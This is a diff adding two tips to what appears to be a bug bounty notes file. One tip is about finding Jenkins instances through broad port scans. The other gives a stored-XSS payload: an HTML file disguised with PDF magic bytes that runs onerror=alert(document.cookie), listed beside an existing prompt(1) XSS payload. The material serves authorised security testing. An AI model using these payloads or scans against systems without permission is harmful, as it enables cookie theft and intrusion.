@@ -1196,6 +1196,9 @@ Also if you can install plugins there is a terminal plugin
 Try dirsearch for /script or use this script to find live Jenkins instances.
 
 Also worth checking Port 8080 alongside 443,80
+
+
+I recommened if you are working on a big program with thousands of domains to grep for jenkins and pipe all subdomains into full tcp ports scans. Sometimes the instance can be running on a weird port :) 
 ```
 
 
@@ -1352,6 +1355,20 @@ Succesful Payloads so Far
 <img/src=x onerror=prompt(1)>
 
 
+I had success recently also by uploading a .html file with pdf magic bytes at the strat with arbitary javascript to obtain stored XSS on a program.
+
+Payload Below:
+
+
+%PDF-1.4
+%Ã¤Ã¼Ã¶Ã
+2 0 obj
+<</Length 3 0 R/Filter/FlateDecode>>
+stream
+x=Ë
+1E÷ù»v¶é´0è~ àø
+R
+R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 
 
 
